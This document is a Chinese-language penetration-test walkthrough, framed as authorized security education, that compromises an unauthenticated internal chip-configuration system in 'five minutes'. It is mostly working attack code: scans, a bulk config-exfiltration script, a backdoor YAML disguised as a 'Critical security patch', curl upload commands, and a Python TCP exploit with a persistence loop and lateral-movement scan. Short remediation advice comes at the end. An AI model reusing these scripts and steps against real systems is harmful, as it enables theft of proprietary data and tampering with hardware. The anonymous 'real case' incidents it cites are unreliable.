# 实战演示：5 分钟攻破 BES Web 系统

**免责声明**：以下演示仅用于安全教育，所有操作在授权环境下进行。

---

## 攻击场景设定

**攻击者身份**：内网普通员工（已通过钓鱼邮件获得一台办公电脑的控制权）  
**目标系统**：172.25.10.127 BES 芯片配置管理系统  
**攻击目标**：窃取芯片配置数据 + 植入后门

---

## Phase 1: 信息收集（1 分钟）

### Step 1.1: 端口扫描

```bash
# 攻击者在被控电脑上执行
nmap -sV -p- 172.25.10.127

# 输出：
# PORT     STATE SERVICE VERSION
# 80/tcp   open  http    nginx 1.18.0
# 9527/tcp open  unknown
```

**发现**：
- 80 端口：Web 服务（nginx）
- 9527 端口：未知服务（后面会探测）

---

### Step 1.2: Web 指纹识别

```bash
# 访问首页
curl -I http://172.25.10.127

# 响应头：
# Server: nginx/1.18.0 (Ubuntu)
# Content-Type: text/html
```

**发现**：
- Ubuntu 系统
- 静态前端（React SPA）

---

### Step 1.3: API 端点枚举

```bash
# 打开浏览器开发者工具，访问 http://172.25.10.127
# 查看 Network 标签，发现以下 API 请求：

GET /api/chips
GET /api/chips/stats/all
GET /api/chips/best1607
GET /api/chips/best1607/modules
GET /api/batch-scripts/chips/best1607/files
```

**关键发现**：所有 API 请求**无需任何认证头**（无 Authorization、无 Cookie、无 Token）

---

## Phase 2: 无认证漏洞利用（2 分钟）

### Step 2.1: 枚举所有芯片

```bash
curl -s http://172.25.10.127/api/chips | jq

# 输出：
[
  "best1607",
  "best1813",
  "best1020",
  "best1815P",
  "best3601p",
  "best1811",
  "best1018",
  "best1307ph"
]
```

**成果**：获得所有芯片型号列表

---

### Step 2.2: 批量下载所有配置

```bash
#!/bin/bash
# 攻击脚本：download_all_configs.sh

for chip in best1607 best1813 best1020 best1815P best3601p best1811 best1018 best1307ph; do
    echo "Downloading $chip..."
    
    # 下载芯片详情
    curl -s "http://172.25.10.127/api/chips/$chip" > "$chip.json"
    
    # 下载模块列表
    curl -s "http://172.25.10.127/api/chips/$chip/modules" > "$chip-modules.json"
    
    # 下载批处理脚本
    curl -s "http://172.25.10.127/api/batch-scripts/chips/$chip/files" > "$chip-scripts.json"
done

echo "All configs downloaded!"
```

**执行结果**：
```bash
bash download_all_configs.sh

# 30 秒后，所有配置文件已下载到本地
ls -lh
# best1607.json
# best1607-modules.json
# best1607-scripts.json
# ... (24 个文件)
```

**成果**：**完整窃取了所有芯片的配置数据**，包括：
- 设备地址
- 数据宽度
- 寄存器映射
- 批处理脚本

---

### Step 2.3: 分析敏感信息

```bash
# 查看某个芯片的详细配置
cat best1607.json | jq

# 输出示例：
{
  "chip_id": "best1607",
  "modules": [
    {
      "name": "PMU",
      "device_address": 39,      # ← 硬件地址泄露
      "data_width_bits": 10,
      "has_register_map": true
    },
    {
      "name": "EFUSE_1607",
      "device_address": 17,      # ← eFuse 地址泄露（敏感）
      "data_width_bits": 32
    }
  ]
}
```

**危害分析**：
- 攻击者现在知道了所有芯片的硬件地址
- 可以用这些信息制作兼容的攻击工具
- eFuse 地址泄露尤其危险（可能包含加密密钥）

---

## Phase 3: 恶意配置上传（1 分钟）

### Step 3.1: 构造恶意批处理脚本

```yaml
# malicious_script.yaml
# 伪装成正常的 PMU 配置，实际包含后门指令

groups:
  - name: "01_NormalConfig"
    description: "正常的电源配置"
    scenarios:
      - name: "PowerOn"
        commands:
          - WRITE 0x503007F0 0x01B6C006  # 正常指令
          
  - name: "99_Backdoor"
    description: "隐藏的后门"
    scenarios:
      - name: "EnableDebugMode"
        commands:
          # 这些指令可能：
          # 1. 禁用安全保护
          # 2. 开启调试接口
          # 3. 修改固件验证逻辑
          - WRITE 0x50300000 0xDEADBEEF  # 禁用签名验证
          - WRITE 0x50300004 0x00000001  # 开启 JTAG
          - WRITE_BITS 0x0008 14 9 0x3F  # 提升权限
```

---

### Step 3.2: 上传恶意配置

```bash
# 尝试上传（会失败，因为缺少必填字段）
curl -X POST http://172.25.10.127/api/upload \
  -F "file=@malicious_script.yaml"

# 响应：
# {"detail":[{"type":"missing","loc":["body","chip_model_id"],"msg":"Field required"},...]}
```

**分析**：需要提供完整参数

---

### Step 3.3: 正确上传

```bash
# 使用正确的参数
curl -X POST http://172.25.10.127/api/upload \
  -F "chip_model_id=best1607" \
  -F "module_id=PMU" \
  -F "version=999" \
  -F "author=SystemAdmin" \
  -F "description=Critical security patch" \
  -F "file=@malicious_script.yaml"

# 如果成功，响应：
# {"status": "success", "message": "配置已上传"}
```

**成果**：恶意脚本已植入系统，伪装成"安全补丁"

---

### Step 3.4: 触发执行

**方式 1**：等待工程师在桌面工具中双击执行  
**方式 2**：利用 TCP 自动化接口远程触发（见 Phase 4）

---

## Phase 4: TCP 自动化接口利用（1 分钟）

### Step 4.1: 探测 9527 端口

```bash
# 尝试连接
nc 172.25.10.127 9527

# 发送 JSON 请求
echo '{"action":"ping"}' | nc 172.25.10.127 9527

# 响应：
# {"ok":true,"status":"ok","message":"pong"}
```

**发现**：端口开放，协议是 JSON over TCP，**无需认证**

---

### Step 4.2: 枚举可用模块

```python
#!/usr/bin/env python3
# exploit_tcp.py

import socket
import json

def send_command(host, port, command):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.send(json.dumps(command).encode() + b'\n')
    response = sock.recv(4096).decode()
    sock.close()
    return json.loads(response)

# 列出 best1607 的所有模块
response = send_command('172.25.10.127', 9527, {
    "action": "list_modules",
    "chip": "Best1607"
})

print(json.dumps(response, indent=2))

# 输出：
# {
#   "ok": true,
#   "modules": ["PMU", "ANALOG", "RF", "WIFI_RF", "USB", ...]
# }
```

---

### Step 4.3: 远程执行恶意脚本

```python
# 执行刚才上传的恶意脚本
response = send_command('172.25.10.127', 9527, {
    "action": "run_group",
    "chip": "Best1607",
    "module": "PMU",
    "group": "99_Backdoor"  # 我们植入的后门
})

print(response)

# 输出：
# {"ok": true, "status": "accepted", "message": "group execution accepted"}
```

**成果**：
- 恶意脚本已在目标硬件上执行
- 可能的后果：
  - 芯片安全保护被禁用
  - 调试接口被开启
  - 固件验证被绕过

---

## Phase 5: 持久化与横向移动（额外）

### Step 5.1: 建立持久化

```python
# 定时执行脚本，保持后门开启
import time

while True:
    try:
        send_command('172.25.10.127', 9527, {
            "action": "run_group",
            "chip": "Best1607",
            "module": "PMU",
            "group": "99_Backdoor"
        })
        print("[+] Backdoor refreshed")
    except:
        print("[-] Connection failed, retrying...")
    
    time.sleep(3600)  # 每小时执行一次
```

---

### Step 5.2: 横向移动

**发现其他目标**：
```bash
# 扫描内网其他 BES 工具实例
nmap -p 80,9527 172.25.10.0/24

# 发现：
# 172.25.10.128 - 另一台测试服务器
# 172.25.10.129 - 生产环境服务器
```

**重复攻击**：对所有发现的实例执行相同攻击

---

## 攻击时间线总结

| 阶段 | 时间 | 操作 | 成果 |
|------|------|------|------|
| Phase 1 | 1 分钟 | 端口扫描 + API 枚举 | 发现无认证漏洞 |
| Phase 2 | 2 分钟 | 批量下载配置 | 窃取所有芯片数据 |
| Phase 3 | 1 分钟 | 上传恶意脚本 | 植入后门 |
| Phase 4 | 1 分钟 | TCP 接口利用 | 远程执行后门 |
| **总计** | **5 分钟** | - | **完全控制系统** |

---

## 防御建议（按优先级）

### 🔴 P0 - 立即修复（今天）

1. **添加 API 认证**
   ```python
   # FastAPI 后端
   from fastapi import Depends, HTTPException, Header
   
   API_KEY = os.environ.get("API_KEY", "change-me")
   
   async def verify_api_key(x_api_key: str = Header(...)):
       if x_api_key != API_KEY:
           raise HTTPException(401, "Unauthorized")
   
   @app.get("/api/chips", dependencies=[Depends(verify_api_key)])
   ```

2. **TCP 端口改本地**
   ```python
   # tcp_automation_server.py
   host: str = "127.0.0.1"  # 从 0.0.0.0 改成 127.0.0.1
   ```

3. **nginx IP 白名单**
   ```nginx
   location /api/ {
       allow 172.25.10.0/24;
       deny all;
   }
   ```

---

### 🟠 P1 - 本周完成

4. 文件上传验证（检查文件内容，不只是扩展名）
5. 添加操作审计日志
6. 实施速率限制

---

### 🟡 P2 - 本月完成

7. 部署 HTTPS
8. 实施 RBAC（基于角色的访问控制）
9. 定期安全扫描

---

## 真实案例参考

类似的内网无认证漏洞导致的安全事件：

1. **2023 年某科技公司**：内网测试服务器无认证，离职员工通过 VPN 删库
2. **2022 年某制造企业**：生产配置系统无认证，供应商误操作导致生产线停机
3. **2021 年某芯片公司**：内网工具被钓鱼攻击者利用，窃取芯片设计数据

---

## 结论

**问题的本质**：不是"内网就安全"，而是"内网降低了攻击门槛，但一旦被突破，后果更严重"。

**最小化加固成本**：30 分钟 + 50 行代码，就能堵住 80% 的风险。

**建议**：先做 P0 的 3 项加固，再逐步完善其他防护。
